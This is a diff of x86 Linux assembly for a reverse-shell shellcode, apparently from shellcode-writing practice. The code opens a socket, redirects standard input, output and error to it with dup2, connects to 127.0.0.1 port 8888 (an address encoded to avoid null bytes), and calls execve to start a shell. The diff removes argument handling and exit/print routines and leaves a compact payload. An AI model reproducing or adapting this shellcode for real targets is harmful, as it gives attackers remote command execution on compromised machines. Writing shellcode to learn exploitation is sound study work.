@@ -10,37 +10,6 @@ global _start
 
 section .text
 _start:
-	pop ecx			; argc in ecx
-	cmp ecx, 3
-	jnz exit  		; If argc != 3 -> EXIT
-	pop ecx 		; quito el nombre de la función	
-
-
-
-
-
-
-
-;print_message:
-;	; Print message
-;	xor eax, eax
-;	mov al, 0x4
-;	xor ebx, ebx
-;	mov bl, 1
-;	push 0x0a20202e
-;	push 0x2e2e6c6c
-;	push 0x65687320
-;	push 0x65737265
-;	push 0x76657220
-;	push 0x676e696e
-;	push 0x77617053
-;	mov ecx, esp
-;	xor edx, edx
-;	mov dl, 28
-;	int 0x80
-
-
-socket:
 	; Socket - 359
 	; int socket (
     ;  int domain = 2;
@@ -57,41 +26,22 @@ socket:
 	int 0x80
 	mov dword esi, eax
 
-nextarg:
-	pop ecx ; get pointer to string
-	;test ecx, ecx
-	;jz exit
-	xor edx, edx 
 
-getlen: ; now we need to find the length of our (zero-terminated) string
-	cmp byte [ecx + edx], 0
-	jz print_ip
-	inc edx
-	jmp getlen
-
-print_ip:
-	xor eax, eax
-	mov al, 0x4
-	xor ebx, ebx
-	mov bl, 1
-	int 0x80
-	
-	
 dup2:
-	;dup2 - 0
+	;fd 0
 	xor eax, eax
 	mov al, 0x3f
 	mov ebx, esi
 	xor ecx, ecx
 	int 0x80
-	;dup2 - 1
+	;fd 1
 	xor eax, eax
 	mov al, 0x3f
 	mov ebx, esi
 	xor ecx, ecx
 	mov cl, 1
 	int 0x80
-	;dup2 - 2
+	;fd 2
 	xor eax, eax
 	mov al, 0x3f
 	mov ebx, esi
@@ -100,41 +50,21 @@ dup2:
 	int 0x80
 
 
-
-
-
 connect:
 	;Connect - 362
 	xor eax, eax
 	mov ax, 0x16a
-	mov ebx, esi
-	
+	mov ebx, esi	
 	xor edi, edi
-	push dword edi 		; push 0 => ip 0.0.0.0
-    push edi			; port 8888, big endian
+	mov edi, 0x12111190 ; We want 0x100007F, but we need to avoid nops
+	sub edi, 0x11111111
+	push edi  			;push 16777343		; ip 127.0.0.1, big endian
     push word 0xb822 	; port 8888, big endian
     push word 2 
 	mov ecx, esp
-
-;	xor edi, edi
-;	xor edx, edx
-;	pop edi 		; argv 0
-;	pop edi 		; argv 1
-;	pop edx 		; argv 2
-;	push dword edi 	; push IP (argv 1)
-;	xor edi, edi
-;	push edi			; port 8888, big endian
-;	;push word edx
-;	push word 0xb822
-;	push word 2 
-;	mov ecx, esp
-
 	xor edx, edx
 	mov dl, 0x66 		; 102
 	int 0x80
-	jmp execve
-
-
 
 
 execve:
@@ -150,24 +80,3 @@ execve:
 	mov ecx, esp
 	mov al, 11
 	int 0x80
-
-
-exit:
-	; Print message
-	xor eax, eax
-	mov al, 0x4
-	xor ebx, ebx
-	mov bl, 1
-	push 0x74697845
-	mov ecx, esp
-	xor edx, edx
-	mov dl, 4
-	int 0x80
-	; Exit
-	mov   eax,1
-	mov   ebx,1
-	int   0x80      ; Exit
-
-
-
-
